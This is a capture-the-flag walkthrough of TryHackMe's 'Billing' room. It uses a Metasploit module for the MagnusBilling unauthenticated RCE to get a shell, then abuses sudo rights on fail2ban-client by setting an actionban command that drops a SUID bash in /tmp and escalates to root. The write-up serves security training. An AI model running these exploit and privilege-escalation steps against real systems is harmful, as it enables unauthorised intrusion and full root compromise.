# Overview

Today we will work on [TryHackMe](https://tryhackme.com/room/billing)'s "Billing" roomâ€”an easy room focusing on abusing **indirect file permission manipulation via sudo**. So let's begin

# Reconnaisance

Let's begin with the usual, performing nmap scan. I run the `-p-` `-v` scan to quickly grab the ports, then run `-sCV` on them specifically.
```
$ nmap -p 22,80,3306 -sCV 10.10.226.215
Nmap scan report for billing.thm (10.10.226.215)
Host is up (0.100s latency).

```
We see that it has HTTP port open, so I added it to my `etc/hosts` file and I would've ran `ffuf` in the hopes of finding some subdirectories or folders while I manually browse the webpage, but since the room said "Bruteforcing is out of scope" I skipped on that.

## HTTP: MagnusBilling

From the Nmap scan and accessing the website we see that it is running MagnusBilling, which is a VoIP billing platform. I immediately ran some basic creds and their own default cred of `root:magnus` but to no avail.
![Image](/ctf-vault/assets/images/articles/mbilling.png){:.rounded}

I parked it for later, and simply searched "magnusbilling vulnerability" and came across [Rapid7's database](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/) which said MagnusBilling v6.x and v7.x are vulnerable to RCE. Since we couldn't find the version running on the platform (without bruteforcing!), let's simply try running this exploit.

# Foothold
So I searched the module and loaded it with all the required parameters before running it.
```shell
$ msfconsole -q
msf6 > search magnusbilling

Matching Modules
================

Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

msf6 > use 0

```
And voila! We have a shell! I then did the usual of having a basic shell through python.
```shell
meterpreter > shell

Channel 0 created.
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```
# User Flag
The user flag was straightforward. Upon checking the `/home/` directory we see that anybody can read the directory and the user flag present inside was also readable.
```shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ls -l /home

```

# Root Flag

Once I get a foothold or user flag, one of the first things I do is check what can I run as a superuser. And luckily enough we do have permission to run certain application as `sudo`.

```shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```

## Fail2Ban
Okay so what is `Fail2Ban`? It's an open-source intrusion prevention software that protects Linux servers from malicious attacks, **particularly brute-force attacks**. Hmm, maybe that's why the room said bruteforcing was not allowed. Okay so upon looking up its basic functionality, we find that we can configure an action it does upon successfully blocking something.

### Abusing Fail2Ban

Upon checking the manual pages we find this interesting option:
```shell
$ fail2ban-client set <JAIL> action <ACT> actionban <ACT> <COMMAND>
```
This configures the command to execute if certain action is executed on the specified service. We can try to add the "action" into the configuration file of the application, but we can rather directly type the command on the command-line. My action plan is to copy `bash` to a temporary directoy and setting SUID bit on itself to gain privileged shell.

In order to do that we can:

```shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client restart
<g/lib/icepay$ sudo /usr/bin/fail2ban-client restart
Shutdown successful
Server ready
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/usr/bin/cp /bin/bash /tmp && chmod 4755 /tmp/bash"
/usr/bin/cp /bin/bash /tmp && chmod 4755 /tmp/bash
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
<o /usr/bin/fail2ban-client set sshd banip 127.0.0.1
1
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ls -l /tmp
ls -l /tmp
total 1208
-rwsr-xr-x 1 root root 1234376 May 21 13:19 bash
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```

And with that we got a SUID bash ready to be executed!

## Privilege Escalation

Simply executing this `bash` with the `-p` flag will give us a privileged shell with which we can read root flag.

```shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ /tmp/bash -p
bash-5.1# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) groups=1001(asterisk)
bash-5.1# cat /root/root.txt
THM{33...REDACTED...60}
bash-5.1#
```

# Extra
Remember we were warned against bruteforcing. But if we were allowed, we would have come across their README file.

```shell
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://billing.thm/mbilling/FUZZ

And upon checking the README we would have confirmed they are using the vulnerable version.
